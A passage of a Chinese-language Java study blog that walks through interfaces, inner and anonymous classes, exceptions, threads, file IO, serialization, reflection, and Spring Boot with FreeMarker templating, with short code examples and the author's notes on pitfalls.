System.out.println(&quot;僵尸在跑&quot;); }}class Crepper extends monster{ @Override public void attack(){ System.out.println(&quot;苦力怕炸了&quot;); } public void run(){ System.out.println(&quot;苦力怕在追你！&quot;); }} 接口： 12345678910111213141516171819202122232425262728293031323334353637package Main;public class Main { public static void main(String[] args) { Zombie zo1 = new Zombie(); Crepper crep1 = new Crepper(); zo1.run(); zo1.attack(); crep1.run(); crep1.attack(); }}interface monster { public void attack();//接口的方法不能有方法体 public void run();}class Zombie implements monster{ @Override public void attack(){ System.out.println(&quot;僵尸在攻击&quot;); } @Override public void run(){ System.out.println(&quot;僵尸在跑&quot;); }}class Crepper implements monster{ @Override public void attack(){ System.out.println(&quot;苦力怕炸了&quot;); } public void run(){ System.out.println(&quot;苦力怕在追你！&quot;); }} 应用： 123456789101112131415161718192021222324public interface DBInterface { //项目经理public void connect();//连接方法public void close();//关闭连接}class A implements DBInterface{ @Override public void connect(){ //连接mysql } @Override public close(){ //断开mysql }}class A implements DBInterface{ @Override public void connect(){ //连接oracle } @Override public close(){ //断开Oracle }} 12345//1.接口不能被实例化//2.接口中所有的方法是 public 方法, 接口中抽象方法，可以不用 abstract 修饰//3.一个普通类实现接口,就必须将该接口的所有方法都实现,可以使用 alt+enter 来解决//4.抽象类去实现接口时，可以不实现接口的抽象方法//5.接口可以继承其他接口 内部类： 内部类可以直接访问私有属性，定义在外部类局部： 123456789101112131415161718192021222324252627package Main;public class Main { public static void main(String[] args) { Monster m = new Monster(); m.method(); }}class Monster{ private int attackValue = 10; private void privateMethod(){ System.out.println(&quot;这是Monster的私有方法&quot;); } class Behavior{ public void attack(){ System.out.println(&quot;僵尸对你造成了&quot;+attackValue+&quot;伤害&quot;);//可以换为Monster.this.attackValue privateMethod();//内部类访问外部类对象时直接访问， } } public void method(){ System.out.println(&quot;666&quot;); Behavior be = new Behavior();//外部类访问内部类属性时要创建类对象 be.attack();//外部类在方法中，可以创建 be 对象，然后调用方法即可 }} 当然亦可以定义在外部类方法中： 1234567891011121314151617181920212223242526package Main;public class Main { public static void main(String[] args) { Monster m = new Monster(); m.method(); }}class Monster{ private int attackValue = 10; private void privateMethod(){ System.out.println(&quot;这是Monster的私有方法&quot;); } public void method(){ class Behavior{ public void attack(){ System.out.println(&quot;僵尸对你造成了&quot;+Monster.this.attackValue+&quot;伤害&quot;); privateMethod(); } } Behavior be = new Behavior(); be.attack(); }} 匿名内部类： 没有类名：匿名类没有类名，它是在创建实例的同时定义类的一种方式。 直接在代码中定义：匿名类通常在创建对象的位置直接定义，通常是作为接口的实现或父类的扩展。 只能继承一个类或实现一个接口：一个匿名类可以继承一个类，或者实现一个接口，但不能同时做两者。 可以访问外部的变量：匿名类可以访问其外部作用域中的变量，但是这些变量必须是 final 或者事实上是 final 的（也就是说不能在匿名类中对它们进行修改）。 12345678910111213141516interface Greeting { void greet();}public class Main { public static void main(String[] args) { Greeting greeting = new Greeting() { @Override public void greet() { System.out.println(&quot;Hello!&quot;); } }; greeting.greet(); // 输出 &quot;Hello!&quot; }} 匿名类在方法中作为参数，高效： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566package Main;public class Main { public static void main(String[] args) { Zombie zo1 = new Zombie(); Crepper crep1 = new Crepper(); zo1.run(); zo1.attack(); crep1.run(); crep1.attack(); monster aa = new monster() { @Override public void attack() { System.out.println(&quot;1&quot;); } @Override public void run() { System.out.println(&quot;1&quot;); } };// aa.run(); func(new monster(){ @Override public void attack(){ System.out.println(&quot;改写attack&quot;); } @Override public void run(){ System.out.println(&quot;改写run&quot;); } });//直接当函数参数使用 func(new Zombie());//传统方法调用 } public static void func(monster m){ //静态方法 m.run(); m.attack(); System.out.println(&quot;使用匿名类！&quot;); }}interface monster { public void attack();//接口的方法不能有方法体 public void run();}class Zombie implements monster{ @Override public void attack(){ System.out.println(&quot;僵尸在攻击&quot;); } @Override public void run(){ System.out.println(&quot;僵尸在跑&quot;); }}class Crepper implements monster{ @Override public void attack(){ System.out.println(&quot;苦力怕炸了&quot;); } public void run(){ System.out.println(&quot;苦力怕在追你！&quot;); }} 异常： 12345678910111213package Main;public class Main { public static void main(String[] args) { try { System.out.println(10/0); } catch (Exception e){ e.printStackTrace(); System.out.println(&quot;出现异常&quot;); } }} 直接用Exception，捕获所有类型的异常 12345678910111213141516171819202122232425package Main;public class Main { public static void main(String[] args) { try { //可能发生异常的代码 System.out.println(10/0); } catch (Exception e){ /* *当异常发生时 * 将异常封装成Exception对象e，传递给catch *执行catch内的代码 * 如果没有发生异常，catch内代码不执行 */ e.printStackTrace(); System.out.println(&quot;出现异常&quot;); } finally { //无论有没有发生异常都执行 //释放资源等代码常常放在finally中 System.out.println(&quot;无论如何都执行&quot;); } }} 1234567891011121314151617181920212223242526package Main;public class Main { public static void main(String[] args) { try { //可能发生异常的代码 for (int i = 5; i &gt;= -5;i -- ) System.out.println(&quot;10/&quot;+i+&quot;=&quot;+10/i); //异常发生后执行catch代码，try剩下代码不执行 } catch (Exception e){ /* *当异常发生时 * 将异常封装成Exception对象e，传递给catch *执行catch内的代码 * 如果没有发生异常，catch内代码不执行 */ e.printStackTrace(); System.out.println(&quot;出现异常&quot;); } finally { //无论有没有发生异常都执行 System.out.println(&quot;无论如何都执行&quot;); } }} 常用类： 12345678910111213public class WrapperMethod { public static void main(String[] args) { System.out.println(Integer.MIN_VALUE); //返回最小值 System.out.println(Integer.MAX_VALUE);//返回最大值 System.out.println(Character.isDigit('a'));//判断是不是数字 System.out.println(Character.isLetter('a'));//判断是不是字母 System.out.println(Character.isUpperCase('a'));//判断是不是大写 System.out.println(Character.isLowerCase('a'));//判断是不是小写 System.out.println(Character.isWhitespace('a'));//判断是不是空格 System.out.println(Character.toUpperCase('a'));//转成大写 System.out.println(Character.toLowerCase('A'));//转成小写 }} string类常用方法： 占位符：%s 字符串 %c 字符 %d 整型 %.2f 浮点型 String类中的foemat方法： 123456789101112131415package Main;public class Main { public static void main (String[] args) { try { String str = &quot;name:%s,age:%d,gender:%c,height:%f&quot;; str = String.format(str,&quot;potato&quot;,19,'m',186.0); System.out.println(str); }catch (Exception e){ System.out.println(&quot;233&quot;); } }} 123StringBuffer buffer = new StringBuffer(&quot;hello&quot;);buffer.append(&quot; world&quot;);String finalString = buffer.toString(); valueOf()方法： 将一个特定类型的值转换成其他类型的值。例： 1String.valueOf(114514);//代表将整数42转化成字符串42 Array类： Date类： 1234567891011121314151617package Main;import java.text.SimpleDateFormat;import java.util.Date;public class Main { public static void main (String[] args) { Date d1 = new Date(); System.out.println(d1); SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy 年 MM 月 dd 日 hh:mm:ss E&quot;); String format = sdf.format(d1); // format:将日期转换成指定格式的字符串 System.out.println(&quot;当前日期=&quot; + format); }}//Mon Sep 18 11:14:47 CST 2023//当前日期=2023 年 09 月 18 日 11:14:47 周一 时间戳： 1234567891011121314151617181920package Main;import java.text.SimpleDateFormat;import java.time.Instant;import java.util.Date;public class Main { public static void main (String[] args) { Instant now = Instant.now();//通过now()方法获取当前时间戳对象 System.out.println(now); Date date = Date.from(now);//通过Date可以把instant转为date System.out.println(date); SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy年MM月dd日 hh:mm:ss&quot;); String d = sdf.format(date); System.out.println(d); Instant t = date.toInstant();//通过Date类的toInstant()方法将Date对象转为时间戳 System.out.println(t); }} Node节点： 1234567891011class Node { public Object item; //真正存放数据 public Node next; //指向后一个结点 public Node pre; //指向前一个结点 public Node(Object name) { this.item = name; } public String toString() { return &quot;Node name=&quot; + item; }} 123456789101112Node jack = new Node(&quot;jack&quot;); Node tom = new Node(&quot;tom&quot;); Node hsp = new Node(&quot;老韩&quot;);//连接三个结点，形成双向链表//jack -&gt; tom -&gt; hsp jack.next = tom; tom.next = hsp;//hsp -&gt; tom -&gt; jack hsp.pre = tom; tom.pre = jack; Node first = jack;//让 first 引用指向 jack,就是双向链表的头结点 Node last = hsp; //让 last 引用指向 hsp,就是双向链表的尾结点 输出链表： 12345678while (true) { if(first == null) { break; }//输出 first 信息 System.out.println(first); first = first.next; } ArrayList类链表以及类似于foreach的强循环 123456789101112ArrayList arrayList = new ArrayList();arrayList.add(new Dog(&quot;旺财&quot;, 10));arrayList.add(new Dog(&quot;发财&quot;, 1));arrayList.add(new Dog(&quot;小黄&quot;, 5));//假如我们的程序员，不小心，添加了一只猫arrayList.add(new Cat(&quot;招财猫&quot;, 8));//遍历for (Object o : arrayList) {//向下转型 Object -&gt;DogDog dog = (Dog) o;System.out.println(dog.getName() + &quot;-&quot; + dog.getAge());} 如果用泛型，则不需要转型： 123456789101112131415161718192021222324252627import java.util.ArrayList;public class Main { public static void main(String[] args){ ArrayList&lt;Dog&gt; dogs = new ArrayList&lt;Dog&gt;(); dogs.add(new Dog(&quot;lff&quot;,19)); dogs.add(new Dog(&quot;wmt&quot;,19)); for (Dog dog : dogs){ dog.eat(); } }}class Dog{ public String name; public int age; public Dog(String name,int age){ this.name = name; this.age = age; } public void eat(){ System.out.println(this.name+&quot; is eating&quot;); }}//泛型的作用是：可以在类声明时通过一个标识表示类中某个属性的类型，//或者是某个方法的返回值的类型，或者是参数类型 泛型的声明： 泛型的实例化： 线程： 1234567891011121314151617181920212223242526272829303132public class Main { public static void main(String[] args){ Dog dog = new Dog(&quot;lff&quot;,19); dog.start();//启动线程，要重写run()方法 }}class Dog extends Thread{ public String name; public int age; @Override public void run(){ while (true){ System.out.println(&quot;dog is running&quot;); try { Thread.sleep(2000);//每隔2秒输出小狗在吃 }catch (Exception e){ e.printStackTrace(); } } } public Dog(String name,int age){ this.name = name; this.age = age; } public void eat(){ System.out.println(this.name+&quot; is eating&quot;); }} 1234567891011121314151617181920212223242526272829303132333435public class Main { public static void main(String[] args){ //dog.start();//启动线程，要重写run()方法 Thread d = new Thread(new Dog(&quot;lff&quot;,19));//此处的差别 d.start(); }}class Animal{}class Dog extends Animal implements Runnable{ public String name; public int age; @Override public void run(){ while (true){ System.out.println(&quot;dog is running&quot;); try { Thread.sleep(2000); }catch (Exception e){ e.printStackTrace(); } } } public Dog(String name,int age){ this.name = name; this.age = age; } public void eat(){ System.out.println(this.name+&quot; is eating&quot;); }} 线程常用方法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Main { public static void main(String[] args){ //dog.start();//启动线程，要重写run()方法 Thread d = new Thread(new Dog(&quot;lff&quot;,19)); Thread d1 = new Thread(new Dog(&quot;zyh&quot;,19)); Thread d2 = new Thread(new Dog(&quot;gzc&quot;,19)); Thread d3 = new Thread(new Dog(&quot;acc&quot;,19)); d3.setName(&quot;第四个&quot;);//重命名线程 System.out.println(d.getName()); try { Thread.sleep(3000); }catch (Exception e){ }//sleep必须捕获异常处理 System.out.println(d2.getName()); System.out.println(d3.getName()); d.start(); }}class Animal{}class Dog extends Animal implements Runnable{ public String name; public int age; @Override public void run(){ while (true){ System.out.println(&quot;dog is running&quot;); try { Thread.sleep(2000); }catch (Exception e){ e.printStackTrace(); } } } public Dog(String name,int age){ this.name = name; this.age = age; } public void eat(){ System.out.println(this.name+&quot; is eating&quot;); }} 同步： 多线程编程中，有些敏感数据不希望被多个线程同时访问，此时就需要用同步技术来操作，保证数据在同一时刻最多只有一个线程来访问。使用 两种实现方式： 1.同步代码块： 12345678synchronized{//TODO同步的代码块}eg:Object object = new Object()；synchronized (object){//代码块} 2.用于方法的声明： 123public synchronized static void func(){//同步的代码}//同一时刻只能有一个进程来执行该方法 IO流： FileInputStream流： 1234567891011121314151617181920212223242526272829303132import java.io.File;import java.util.Scanner;public class Main { public static void main(String[] args){ String fileName = &quot;&quot;; while (true){ System.out.println(&quot;请输入文件名：&quot;); Scanner input = new Scanner(System.in); fileName = input.next(); new create(fileName).createFile(); } }}class create{ final String root = &quot;D:\\\\111\\\\&quot;; private String fileName = &quot;&quot;; public create(String name){ fileName = name; } public void createFile(){ File file = new File(root+this.fileName); //File file = new File(root,this.fileName);) //根据父目录+子路径构建 try { file.createNewFile(); System.out.println(&quot;文件&quot;+this.fileName+&quot;创建成功&quot;); }catch (Exception e){ e.printStackTrace(); } }} 或者根据父路径的类再new一个类： 1234567891011121314151617181920212223242526272829303132import java.io.File;import java.util.Scanner;public class Main { public static void main(String[] args){ String fileName = &quot;&quot;; while (true){ System.out.println(&quot;请输入文件名：&quot;); Scanner input = new Scanner(System.in); fileName = input.next(); new create(fileName).createFile(); } }}class create{ final String root = &quot;D:\\\\111\\\\&quot;; File f1 = new File(root);//此处！！！ private String fileName = &quot;&quot;; public create(String name){ fileName = name; } public void createFile(){ File file = new File(f1,this.fileName); try { file.createNewFile(); System.out.println(&quot;文件&quot;+this.fileName+&quot;创建成功&quot;); }catch (Exception e){ e.printStackTrace(); } }} 常见方法： IO流： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.File;import java.io.FileInputStream;import java.util.Scanner;public class Main { public static void main(String[] args){ String fName = &quot;&quot;; while (true){ System.out.println(&quot;请输入文件名：&quot;); Scanner input = new Scanner(System.in); fName = input.next(); int readFile = 0; File file; try { file = new File(fName); if (!file.isFile()){ System.out.println(&quot;文件不存在，即将创建...&quot;); file.createNewFile(); } else { System.out.println(&quot;文件已存在，即将读取文件内容：&quot;); FileInputStream fileInput = null; try { fileInput = new FileInputStream(fName); while ((readFile = fileInput.read()) != -1){ //使用read()，逐字节读入，效率低下 System.out.print((char) readFile); } }catch (Exception e){ e.printStackTrace(); }finally { fileInput.close(); //释放资源 } } }catch (Exception e){ e.printStackTrace(); } } }} 666.txt内容如下： 每8字节读取来提高效率将导致输出如下： 开1024字节的缓存空间，输出如下：不管是哪一种，都注意输出时的new 一个string对象 FileOutputStream： 12345678910111213141516171819202122232425262728293031import java.io.File;import java.io.FileOutputStream;import java.util.Scanner;public class Main { public static void main(String[] args){ String fName = &quot;&quot;; while (true) { System.out.println(&quot;请输入文件名：&quot;); Scanner input = new Scanner(System.in); fName = input.next(); System.out.println(&quot;请输入写入文件的内容：&quot;); String str = input.next(); int writeFile = 0; FileOutputStream output = null; File file; try { output = new FileOutputStream(fName); //output = new FileOutputStream(fName);没有true参数，内容会覆写而不是追加 file = new File(fName); output.write(str.getBytes(),1,3); //output.write(str.getBytes(),int off,int len);无偏移参数的话默认全部写入，否则写入从下标为off位置长度为len System.out.println(&quot;已向&quot;+fName+&quot;内写入&quot;+str); }catch (Exception e){ e.printStackTrace(); } } }} copy文件： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.FileInputStream;import java.io.FileOutputStream;import java.util.Scanner;public class Main { public static void main(String[] args){ String fName = &quot;&quot;; while (true) { System.out.println(&quot;请输入文件名：&quot;); Scanner input = new Scanner(System.in); fName = input.next(); byte[] buffer = new byte[1024]; //定义一个字节数组,提高读取效果 int writeFile = 0; String str = &quot;d:/111/copy.txt&quot;; FileOutputStream fileOutputStream = null; FileInputStream fileInputStream = null; try { fileInputStream = new FileInputStream(fName); fileOutputStream = new FileOutputStream(str); while ((writeFile = fileInputStream.read(buffer)) != -1){ fileOutputStream.write(buffer,0,writeFile); //读取到后，就写入到文件 通过 fileOutputStream //即，是一边读，一边写 } }catch (Exception e){ e.printStackTrace(); }finally { try { if (fileInputStream != null){ fileInputStream.close(); } if (fileOutputStream != null){ fileOutputStream.close(); }//释放资源，释放资源时需要在finally语句内套try语句，close()方法需要捕获异常处理！ }catch (Exception e){ e.printStackTrace(); } } } }} 释放资源，释放资源时需要在finally语句内套try语句，close()方法需要捕获异常处理！ BufferedReader读取文件： 1234567891011121314151617181920212223242526import java.io.BufferedReader;import java.io.FileReader;public class Main { public static void main(String[] args){ String path = &quot;d:/111/666.txt&quot;; try { BufferedReader bufferedReader = new BufferedReader(new FileReader(path)); String line = &quot;&quot;; while ((line = bufferedReader.readLine()) != null){ //1. bufferedReader.readLine() 是按行读取文件 //2. 当返回 null 时，表示文件读取完毕 System.out.println(line); } try { bufferedReader.close(); //释放资源 }catch (Exception e){ e.printStackTrace(); } }catch (Exception e){ e.printStackTrace(); } }} BufferedWriter: 12345678910111213141516171819import java.io.BufferedWriter;import java.io.FileWriter;public class Main { public static void main(String[] args){ String path = &quot;d:/111/666.txt&quot;; try { BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(path)); //FileWriter(path,true)的话是追加模式 bufferedWriter.write(&quot;hello&quot;); bufferedWriter.newLine(); bufferedWriter.write(&quot;potato&quot;); bufferedWriter.close(); }catch (Exception e){ e.printStackTrace(); } }} 序列化反序列化： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.*;import java.util.Scanner;public class Main { public static void main(String[] args){ String path = &quot;d:/111/666.dat&quot;; Scanner input = new Scanner(System.in); int flag = input.nextInt(); if (flag == 1){ try { //序列化 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(path)); oos.writeObject(new Dog(&quot;wmt&quot;,19)); oos.writeInt(11); //System.out.println(); oos.close(); }catch (Exception e){ e.printStackTrace(); } }else { try { //反序列化 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path)); System.out.println(ois.readObject()); System.out.println(ois.readInt()); ois.close(); }catch (Exception e){ e.printStackTrace(); } } }}class Dog implements Serializable { //序列化的类需要实现Serializable接口 private String name; private int age; public Dog(String name,int age){ this. name = name; this.age = age; } public void eat(){ System.out.println(&quot;111&quot;); }} 被transient修饰的成员变量不会被序列化 一些其他：(引入Properties类) 1234567891011121314151617181920212223242526import java.io.BufferedReader;import java.io.FileReader;public class Main { public static void main(String[] args){ String path = &quot;d:/111/info.txt&quot;; String line; try { BufferedReader bufferedReader = new BufferedReader(new FileReader(path)); while ((line = bufferedReader.readLine()) != null){ //循环逐行读取 String[] info = line.split(&quot;=&quot;); //split的用途 System.out.println(info[0]+&quot;:&quot;+info[1]); } try { bufferedReader.close(); }catch (Exception e){ e.printStackTrace(); } }catch (Exception e){ e.printStackTrace(); } }} Properties类： 123456789101112131415161718192021222324252627import java.io.FileOutputStream;import java.io.FileReader;import java.util.Properties;public class Main { public static void main(String[] args) throws Exception{ String path = &quot;d:/111/info.txt&quot;; String line; Properties properties = new Properties(); properties.load(new FileReader(&quot;src//mysql.properties&quot;)); /** properties.list(System.out); //将mysql.properties中的内容打印到控制台 **/ String ip = properties.getProperty(&quot;ip&quot;); String user = properties.getProperty(&quot;user&quot;); String pwd = properties.getProperty(&quot;passwd&quot;); System.out.println(ip); System.out.println(user); System.out.println(pwd); properties.setProperty(&quot;ip&quot;,&quot;124.70.99.198&quot;); //修改配置文件 properties.store(new FileOutputStream(&quot;src//mysql.properties&quot;),null); //记得保存配置文件 }} 反射： 出现如下情况，为Dog类未提供一个无参的构造函数： 可以使用Constructor类来进行反射的构造： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package Main;import java.io.FileReader;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Properties;public class Main { @SuppressWarnings({&quot;all&quot;}) public static void main(String[] args) throws Exception{ Properties properties = new Properties(); properties.load(new FileReader(&quot;src//mysql.properties&quot;)); String classpath = properties.getProperty(&quot;classpath&quot;);//Main.Dog String methodName = properties.getProperty(&quot;methodName&quot;);//eat Class cls = Class.forName(classpath); System.out.println(&quot;==================&quot;); System.out.println(cls.getPackage()); //获取包名 System.out.println(&quot;==================&quot;); Constructor constructor = cls.getConstructor(String.class,int.class,String.class); //有参构造的类需要像这样创建一个新的类对象构造 Dog o = (Dog)constructor.newInstance(&quot;potato&quot;,18,&quot;black&quot;); //Obect o = constructor.newInstance(&quot;abc&quot;,11,&quot;black&quot;); //获取实例 System.out.println(o.getClass()); System.out.println(&quot;==================&quot;); Method m1 = o.getClass().getMethod(methodName); //获取到类的方法，也可以cls.getMethod(methodName) m1.invoke(o); //invoke()，调用是来自于哪个对象的方法，此处是名为potato，年龄为18，黑色的Dog对象 Field field = o.getClass().getField(&quot;name&quot;); //Field field = o.getClass().getField(&quot;age&quot;);不行，无法读取私有属性 Field[] fields = o.getClass().getFields(); System.out.println(&quot;==================&quot;); for (Field f : fields){ System.out.println(f.getName()+&quot;=&quot;+o.getClass().getField(f.getName()).get(o)); //输出所有非私有属性以及值 } System.out.println(&quot;==================&quot;); System.out.println(field.get(o));//potato //获取o对象中的name field.set(o,&quot;lff&quot;); //通过反射给属性赋值 System.out.println(field.get(o));//lff }}class Dog{ public String name; private int age; public String color; public Dog(String name,int age,String color){ this.name = name; this.age = age; this.color = color; } public void eat(){ System.out.println(this.name+&quot; is eating&quot;); }} JSP:SrpingBoot:封装Maven依赖方式实现，封装好了各种常见依赖库(tomcat，spring-boot-starter-web等)，首次创建Spring项目时需要等待片刻等待Maven将依赖和插件安装好 SpringBoot3及以上不支持Java17以下版本。 application.properties，各种配置： 静态文件：静态文件(js,css,img等)放在static目录下： 访问本地8848端口： @Controller和@RestController@RestController注解： 12@RestController是Spring提供的而不是Springboot提供的在类前加上@RestController，该类中所有SpringMVCUrl返回都是json，即数据传输为json格式 @Controller 定义一个url映射@RequestMapping，使用@Controller来转到页面跳转 1234567@Controllerpublic class HelloworldService { @RequestMapping(&quot;/getUser&quot;) public String getUser(){ return &quot;potato&quot;; }} 如果希望返回json： 12345678@Controllerpublic class HelloworldService { @RequestMapping(&quot;/getUser&quot;) @ResponseBody public String getUser(){ return &quot;potato&quot;; }} 但是如果非常多接口方法希望返回json,这样做就显得冗余，使用@RestController注解，所有方法返回json： 1234567@RestControllerpublic class HelloworldService { @RequestMapping(&quot;/getUser&quot;) public String getUser(){ return &quot;potato&quot;; }} 启动服务： DemoApplication.java： 123456789101112131415package com.example.demo;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import com.example.service.*;@SpringBootApplicationpublic class DemoApplication { public static void main(String[] args) {// 启动类入口： SpringApplication.run(HelloworldService.class, args); }} HelloworldService.java： 12345678910111213141516package com.example.service;import org.springframework.boot.autoconfigure.EnableAutoConfiguration;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController//添加@EnableAutoConfiguration注解：@EnableAutoConfigurationpublic class HelloworldService { @RequestMapping(&quot;/getUser&quot;) public String getUser(){ return &quot;potato&quot;; }} 访问接口： ，将@RestController注解改为@Controller注解： 123456789101112131415package com.example.service;import org.springframework.boot.autoconfigure.EnableAutoConfiguration;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@Controller@EnableAutoConfigurationpublic class HelloworldService { @RequestMapping(&quot;/getUser&quot;) public String getUser(){ return &quot;potato&quot;; }} 重启服务，去访问会出现404。加上@ResponseBody注解又可以访问了 如果把主程序入口改为DemoApplication类呢？该如何去访问getUser接口呢？ @ComponentScan加入@ComponentScan注解： 1@ComponentScan(&quot;com.example.service&quot;)//只要是service包中的类都能被扫包扫到 访问成功： 启动类的@SpringBootApplication注解中整合了@EnableAutoConfiguration，@ComponentScan注解，其中@ComponentScan注解的扫包范围是启动类同级的包或是子包(不是同级包要用@CompontScan注解指定扫包，或者将包放在主包下) 配置文件：properties配置文件： 使用@Value注解进行获值： 但是如上图application.properties中，potato一直重复，显得冗余，因此在企业当中一般使用application.yml 渲染Web页面：123com.example.controller //视图层，渲染页面com.example.service //业务逻辑层com.example.dao //数据库访问层 将启动类放置在controller目录的上级目录，就可以控制所有example下的包了 尽量避免使用jsp模板引擎 Springboot提供的默认的模板引擎有： 12345ThymeleafFreeMarkerVelocityGroovyMustache 以FreeMarker为例：在pom文件中引入依赖： 导入依赖之后一定一定一定！！！！更新maven呜呜呜呜呜呜，整了半天结果发现是自己没更新 几个又浪费了我一堆时间的问题： 注意这里直接使用Map接口作为参数，也可以使用HttpServletRequest 接口，然后 123456789@Controllerpublic class ThymeleafController { @RequestMapping(&quot;/index&quot;) public String myThymeleaf(HttpServletRequest request){ User user = new User(&quot;potato&quot;,19,&quot;male&quot;); request.setAttribute(&quot;user&quot;,user); return &quot;index1&quot;; }} 红色的地方： springboot在2.2.0改freemarker默认的模板文件为ftlh了，而不是ftl，淦。。。 当然如果想修改为ftl，可以通过修改yml配置，你甚至可以将它改为任意后缀： 123456789101112131415161718192021spring.freemarker.allow-request-override=false#HttpServletRequest的属性是否可以覆盖controller中model的同名项spring.freemarker.allow-session-override=false#HttpSession的属性是否可以覆盖controller中model的同名项spring.freemarker.cache=false#是否开启缓存#开发模式下设置为false，避免了更改模板还要重启服务，线上设置为true，可提高性能spring.freemarker.charset=UTF-8#模板文件编码spring.freemarker.check-template-location=true#是否检查模板位置spring.freemarker.content-type=text/html#Content-Type的值spring.freemarker.expose-request-attributes=false#是否将HttpServletRequest中的属性添加到Model中spring.freemarker.expose-session-attributes=false#是否将HttpSession中的属性添加到Model中spring.freemarker.suffix=.ftl#模板文件后缀spring.freemarker.template-loader-path=classpath:/templates/#模板文件位置 添加配置： 123spring: freemarker: suffix: .ftl 黄色的部分：返回的渲染文件名不能和模板文件同名，否则会出现如下报错： 1javax.servlet.ServletException: Circular view path [login]: would dispatch back to the current handler URL [/login] again. Check your ViewResolver setup! 出现这个异常的原因通常是由于视图解析器的配置问题引起的。当一个请求到达控制器方法并返回一个字符串时，Spring Boot会根据视图解析器的配置将这个字符串解析为一个视图路径。然后，Spring Boot会尝试将请求分派到这个视图路径上的控制器方法。如果在这个控制器方法中再次返回相同的视图路径，就会导致循环的视图路径，从而抛出异常。 Model： 123456789101112131415161718192021222324package com.example.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import java.util.HashMap;import java.util.Map;@Controllerpublic class FreeMarkerIndexController { @RequestMapping(&quot;/index&quot;) public String Index(Model model){ //纯文本形式的Model参数 model.addAttribute(&quot;name&quot;,&quot;potato&quot;); Map&lt;String, Object&gt; student = new HashMap&lt;&gt;(); student.put(&quot;name&quot;,&quot;土豆&quot;); student.put(&quot;age&quot;,11); student.put(&quot;num&quot;,28); //实体类形式的Model参数 model.addAttribute(&quot;stu&quot;,student); return &quot;index1&quot;; }} index1.ftlh： 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head lang=&quot;en&quot;&gt; &lt;meta charset=&quot;UTF-8&quot;/&gt; &lt;title&gt;Potato&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Hello, ${name}&lt;/p&gt; &lt;p&gt;姓名：${stu.name}&lt;/p&gt; &lt;p&gt;年龄：${stu.age}&lt;/p&gt; &lt;p&gt;序号：${stu.num}&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 另一种： FreeMarkerIndexController.java： 123456789101112131415161718package com.example.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import java.util.HashMap;import java.util.Map;@Controllerpublic class FreeMarkerIndexController { @RequestMapping(&quot;/index&quot;) public String Index(Model model){ Student student = new Student(&quot;potato&quot;,19,28); model.addAttribute(&quot;stu&quot;,student); return &quot;index1&quot;; }} Student.java： 123456789101112131415161718192021222324252627282930package com.example.controller;import org.springframework.stereotype.Controller;public class Student{ public String name; public int age; public int num; //一定一定！！要确保每一个属性的get方法都创建了。否则无法正确获得属性的值 public String getName() { return name; } public int getAge() { return age; } public int getNum() { return num; } public Student(String name,int age,int num){ this.name = name; this.age = age; this.num = num; } public String infoDispaly(){ return name+&quot; is &quot;+age; }} 一定一定！！要确保每一个属性的get方法都创建了。否则无法正确获得属性的值，会出现报错如下： if和list的用法：index1.ftlh： 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head lang=&quot;en&quot;&gt; &lt;meta charset=&quot;UTF-8&quot;/&gt; &lt;title&gt;Potato&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table border=&quot;1&quot;&gt;&lt;#-- 使用border属性值定义表格边界--&gt; &lt;tr&gt;&lt;#-- 使用&lt;tr&gt;标签定义表行--&gt; &lt;th&gt;姓名&lt;/th&gt;&lt;#-- &lt;th&gt;定义表头单元格--&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;成年&lt;/th&gt; &lt;/tr&gt; &lt;#list students as student&gt;&lt;#-- list循环的用法--&gt; &lt;tr&gt; &lt;td&gt;${student.name}&lt;/td&gt;&lt;#-- &lt;td&gt;定义表数据单元格--&gt; &lt;td&gt;${student.age}&lt;/td&gt; &lt;td&gt;${student.num}&lt;/td&gt; &lt;td&gt; &lt;#if (student.age&gt;=18) &gt;&lt;#-- 此处使用技巧，用括号明确逻辑关系以免大于号被用于闭合左尖括号--&gt;&lt;#-- if的用法--&gt; 是 &lt;#else&gt; 否 &lt;/#if&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/#list&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 用括号明确逻辑关系以免大小于号被用于闭合尖括号 或者： 1234gt：大于gte：大于等于lt：小于lte：小于等于 FreeMarkerIndexController.java： 123456789101112131415161718192021package com.example.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import java.util.ArrayList;import java.util.HashMap;import java.util.Map;@Controllerpublic class FreeMarkerIndexController { @RequestMapping(&quot;/index&quot;) public String Index(Model model){ ArrayList&lt;Student&gt; students = new ArrayList&lt;&gt;(); students.add(new Student(&quot;potato&quot;,17,28)); students.add(new Student(&quot;dududu&quot;,19,37)); model.addAttribute(&quot;students&quot;,students); return &quot;index1&quot;; }} Thymeleaf模板引擎：同FreeMarker，先引入依赖： 别忘了重新加载依赖： 配置添加配置，注意与freemarker有细微区别： 12345678910111213server: port: 